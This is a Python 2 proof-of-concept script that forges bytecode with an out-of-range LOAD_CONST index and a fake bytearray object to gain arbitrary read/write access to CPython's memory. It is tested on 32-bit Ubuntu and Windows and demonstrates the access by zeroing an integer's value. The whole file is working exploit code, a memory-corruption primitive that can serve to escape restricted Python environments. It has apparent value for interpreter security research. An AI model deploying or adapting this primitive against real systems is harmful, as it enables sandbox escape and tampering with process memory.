#
# read/write access to python's memory, using a custom bytearray.
# some code taken from: http://tinyurl.com/q7duzxj
#
# tested on:
# Python 2.7.10, ubuntu 32bit
# Python 2.7.8, win32
#
# example of correct output:
# inspecting int=0x41424344, at 0x0228f898
# int ob_type: 0x1e222310
# int's memory: 0x3 0x1e222310 0x41424344
# changing int to NULL..
# 0
#
# pkt
# http://gdtr.wordpress.com

import opcode
import struct
import types

# use this as size of our fake byte array
MAX_SSIZE = (2**31)-1 
# prevent GC of fake objects by creating refs inside a global list
GL = []

def pack_ushort(us):
    return struct.pack('@H', us)

def pack_uint(ui):
    return struct.pack('@I', ui)

def get_opcode(o):
    return chr(opcode.opmap[o])

def read_dword(const_tuple, offset):
    def foo():
        pass

    offset_high, offset_low = offset >> 16, offset & 0xffff

    evil_bytecode  = get_opcode('EXTENDED_ARG') + pack_ushort(offset_high)
    # load a dword from byte_array object
    evil_bytecode += get_opcode('LOAD_CONST') + pack_ushort(offset_low)
    # return it
    evil_bytecode += get_opcode('RETURN_VALUE')

    # set co_stacksize to 4, to avoid assert failure in debug build
    foo.func_code = types.CodeType(
        0, 0, 4, 0,
        evil_bytecode, const_tuple,
        (), (), "", "", 0, ""
    )

    dword = foo()
    return dword

# typedef struct {
#   int ob_refcnt;
#   int *ob_type;
#   int ob_size;
#   int ob_exports;
#   int ob_alloc;
#   char *ob_bytes;
# }
def fake_byte_array_string(start_addr):
    typ = id(bytearray)
    ba = pack_uint(0x41414141) + \
         pack_uint(typ) + \
         pack_uint(MAX_SSIZE) + \
         pack_uint(0) + \
         pack_uint(MAX_SSIZE) + \
         pack_uint(start_addr)
    return ba

def make_mem_object(start_addr):
    global GL

    const_tuple = ()
    addr_const_tuple = id(const_tuple)

    fake_object = fake_byte_array_string(start_addr)
    byte_array = bytearray(fake_object)
    # if byte_array dies, our evil bytearray dies too. Prevent GC by appending
    # to a global list.
    GL.append(byte_array)
    addr_byte_array = id(byte_array)
    # beginning of byte_array
    offset = ((addr_byte_array - addr_const_tuple - 0xC) & 0xffffffff) / 4
    # now advance to pointer to fake byte array
    offset += 5

    #print "const_tuple:", hex(addr_const_tuple)
    #print "byte_array:", hex(addr_byte_array)
    #print "fake_object:", hex(id(fake_object))
    
    ba = read_dword(const_tuple, offset)
    return ba

def make_read_write(m1, m2):
    N = (2**32)-1

    def read_byte(m1, m2, addr):
        addr = addr & N
        if addr<MAX_SSIZE:
            return m1[addr]
        elif addr<2*MAX_SSIZE:
            return m2[addr]
        else:
            assert False

    def write_byte(m1, m2, addr, byte):
        byte = byte & 0xff
        addr = addr & N
        if addr<MAX_SSIZE:
            m1[addr] = byte
        elif addr<2*MAX_SSIZE:
            m2[addr] = byte
        else:
            assert False

    rd = lambda addr: read_byte(m1, m2, addr)
    wr = lambda addr, byte: write_byte(m1, m2, addr, byte)
    return (rd, wr)

def magic():
    # wee need two objects to span 0-0x7fffffff and 0x7fffffff-0xffffffe ranges
    m1 = make_mem_object(0)
    m2 = make_mem_object(MAX_SSIZE)
    (read, write) = make_read_write(m1, m2)
    return (read, write)

(read, write) = magic()

# let's see if it works..
x = 0x41424344
addr = id(x)
print "inspecting int=0x%08x, at 0x%08x"%(x, addr)
print "int ob_type:", hex(id(int))
l = [chr(read(addr+i)) for i in range(12)]
s = "".join(l)
(refcnt, ob_type, digits) = struct.unpack("@III", s)
print "int's memory:", hex(refcnt), hex(ob_type), hex(digits)
print "changing int to NULL.."
for i in range(4):
    write(addr+8+i, 0)
print x
